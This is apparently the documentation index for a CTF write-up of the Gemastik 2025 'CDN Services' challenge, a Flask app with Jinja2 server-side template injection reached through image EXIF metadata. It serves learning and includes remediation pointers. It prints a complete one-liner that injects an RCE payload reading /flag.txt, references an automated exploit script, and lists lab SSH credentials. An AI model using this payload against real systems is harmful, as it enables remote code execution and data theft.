# CDN Challenge - Documentation Index

## 📖 Quick Navigation

This directory contains a complete analysis and exploitation guide for the CDN challenge from Gemastik 2025 Final CTF.

### 🚀 Quick Start

**Want the flag NOW?** Run this:

```bash
python3 exploit.py --payload flag
```

**Want to understand the vulnerability?** Start with `README.md`

## 📁 File Structure

### Documentation Files

1. **README.md** ⭐ START HERE

   - Quick summary of the vulnerability
   - Fast exploitation methods
   - Essential payloads
   - **Read this first for quick understanding**

2. **SUMMARY.md**

   - Complete challenge analysis
   - Attack flow diagrams
   - Payload collection
   - Technical deep dive
   - Learning points
   - **Best for comprehensive understanding**

3. **VULNERABILITY_ANALYSIS.md**

   - Detailed vulnerability explanation
   - Line-by-line code analysis
   - Multiple exploitation methods
   - Complete remediation guide
   - **Best for security researchers**

4. **MANUAL_EXPLOITATION.md**

   - Step-by-step manual exploitation
   - Curl command examples
   - Debugging tips
   - Advanced payloads
   - **Best for hands-on learning**

5. **INDEX.md** (This file)
   - Navigation guide
   - File descriptions
   - Reading order recommendations

### Exploitation Tools

6. **exploit.py**
   - Automated exploitation script
   - Multiple payload options
   - Error handling
   - Clean and documented code
   - **Use this for automated exploitation**

### Challenge Files

7. **chall/** directory

   - Original challenge source code
   - Contains `app.py` (vulnerable application)
   - Templates, static files, etc.

8. **docker-compose.yml**

   - Service configuration
   - Port mappings
   - Environment variables

9. **Dockerfile**
   - Container build instructions
   - Shows flag location and permissions

## 📚 Reading Order

### For CTF Players (Want the flag quickly)

1. `README.md` - Overview and quick exploitation
2. Run `python3 exploit.py --payload flag`
3. Done! 🎉

### For Security Learners (Want to understand)

1. `README.md` - Get the overview
2. `SUMMARY.md` - Understand the attack flow
3. `MANUAL_EXPLOITATION.md` - Try manual exploitation
4. `VULNERABILITY_ANALYSIS.md` - Deep technical details

### For Security Professionals (Want complete analysis)

1. `VULNERABILITY_ANALYSIS.md` - Technical analysis
2. `chall/app.py` - Review vulnerable code
3. `SUMMARY.md` - Understand attack patterns
4. `exploit.py` - Review exploitation techniques

## 🎯 Challenge Information

- **Name:** CDN Services
- **Event:** Gemastik 2025 Final
- **Category:** Web Security
- **Difficulty:** Medium
- **Vulnerability:** Server-Side Template Injection (SSTI)
- **Impact:** Remote Code Execution (RCE)
- **Flag Location:** `/flag.txt`

## 🔑 Key Findings

### Vulnerability Summary

Server-Side Template Injection in Flask application allows attackers to inject malicious Jinja2 template syntax through EXIF metadata in uploaded images, leading to Remote Code Execution.

### Exploitation Requirements

- User account (registration is open)
- Ability to create images with EXIF data (ImageMagick + exiftool)
- Basic understanding of Jinja2 template syntax

### Exploitation Difficulty

**Medium** - Requires:

- Understanding of SSTI concepts
- Knowledge of Jinja2 template syntax
- Ability to manipulate EXIF metadata
- But automated with provided script!

## 🛠️ Prerequisites

### Required Tools

```bash
# Install on Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y imagemagick libimage-exiftool-perl python3 python3-pip curl

# Python dependencies
pip3 install requests
```

### Running the Challenge

```bash
# Start the challenge
docker-compose up -d

# Check if it's running
curl http://localhost:4500

# Access SSH (if needed)
ssh ctfuser@localhost -p 4522
# Password: root
```

## 💡 Quick Reference

### Exploit Command

```bash
python3 exploit.py --payload flag --target http://localhost:4500
```

### Manual Exploitation (One-liner)

```bash
convert -size 100x100 xc:white x.png && exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' x.png && curl -X POST http://localhost:4500/register -d "username=h&password=p" -c c.txt && curl -X POST http://localhost:4500/login -d "username=h&password=p" -b c.txt -c c.txt && curl -X POST http://localhost:4500/upload -b c.txt -F "title=x" -F "image=@x.png" && curl http://localhost:4500/post/1 -b c.txt | grep -oP 'GEMASTIK\{[^}]+\}'
```

### Test SSTI Quickly

```bash
# Test payload: 7*7 = 49
python3 exploit.py --payload test
```

## 📞 Support & Issues

### Common Issues

**Q: "ImportError: No module named requests"**  
A: Install Python dependencies: `pip3 install requests`

**Q: "convert: command not found"**  
A: Install ImageMagick: `sudo apt-get install imagemagick`

**Q: "exiftool: command not found"**  
A: Install exiftool: `sudo apt-get install libimage-exiftool-perl`

**Q: "Connection refused to localhost:4500"**  
A: Start the challenge: `docker-compose up -d`

**Q: "Registration failed"**  
A: Username might already exist, try a different one

**Q: "Payload not working"**  
A: Try the "test" payload first to verify SSTI: `python3 exploit.py --payload test`

## 🎓 Learning Resources

### SSTI Resources

- [HackTricks SSTI Guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PortSwigger SSTI Tutorial](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### Flask Security

- [Flask Security Documentation](https://flask.palletsprojects.com/en/2.3.x/security/)
- [OWASP Flask Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Flask_Security_Cheat_Sheet.html)

### Jinja2 Template Engine

- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [Jinja2 Template Designer Documentation](https://jinja.palletsprojects.com/en/3.1.x/templates/)

## 🏆 Achievement Unlocked

Once you get the flag, you've successfully:

- ✅ Identified SSTI vulnerability
- ✅ Crafted malicious EXIF metadata
- ✅ Bypassed input validation (or lack thereof)
- ✅ Achieved Remote Code Execution
- ✅ Read sensitive files
- ✅ Captured the flag

**Congratulations! 🎉**

## 📝 Notes

- All documentation assumes you're running on Linux/WSL
- Target URL defaults to `http://localhost:4500`
- Default credentials for SSH: `ctfuser:root`
- Flag format: `GEMASTIK{...}`
- Flag location: `/flag.txt` in the container

## 🤝 Contributing

Found a better payload? Have a different exploitation method? Create an issue or pull request!

---

**Happy Hacking! 🚀**

_This documentation was created for educational purposes as part of the Gemastik 2025 Final CTF competition._

